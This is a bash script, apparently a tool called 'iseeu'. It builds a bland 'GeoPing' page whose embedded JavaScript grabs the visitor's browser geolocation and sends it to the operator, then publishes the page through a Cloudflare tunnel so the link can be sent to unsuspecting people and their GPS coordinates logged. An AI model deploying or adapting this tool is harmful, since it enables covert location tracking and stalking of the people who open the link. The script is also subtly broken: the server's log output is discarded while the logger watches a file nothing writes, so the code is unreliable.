#!/bin/bash

clear

read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
FIFO="$HOME/.cfpipe"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null
rm -f "$FIFO"

mkdir -p "$WEB_DIR" "$LOG_DIR"
cd "$WEB_DIR" || exit 1
> "$LOG_FILE"

echo "[*] Creating minimal HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
  <title>GeoPing</title>
  <script>
    navigator.geolocation.getCurrentPosition(
      pos => fetch('/logme/' + pos.coords.latitude + ',' + pos.coords.longitude),
      () => {}
    );
  </script>
</head>
<body><p>Loaded.</p></body>
</html>
EOF

echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

echo "[*] Starting Cloudflared tunnel..."
mkfifo "$FIFO"
cloudflared tunnel --url "http://localhost:$PORT" > "$FIFO" 2>/dev/null &
CF_PID=$!

echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  read -t 1 line < "$FIFO"
  echo -n "."
  URL=$(echo "$line" | grep -oE "https://.*\.trycloudflare\.com")
  if [[ -n "$URL" ]]; then break; fi
done
echo
rm -f "$FIFO"

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get public URL."
  kill $SERVER_PID $CF_PID 2>/dev/null
  exit 1
fi

# Lightweight HTTP handler (grep from logs)
echo "[*] Logging to $LOG_FILE"
tail -n 0 -F "$HOME/.cache/http_server.log" | \
while read -r line; do
  if echo "$line" | grep -q "/logme/"; then
    GPS=$(echo "$line" | grep -oP "/logme/\K[^ ]+")
    echo "[$(date)] GPS: $GPS" >> "$LOG_FILE"
  fi
done &

TAIL_PID=$!

trap 'echo; echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID $TAIL_PID 2>/dev/null; echo "[*] Done."; exit 0' INT

echo "[*] Press Ctrl+C to stop."
wait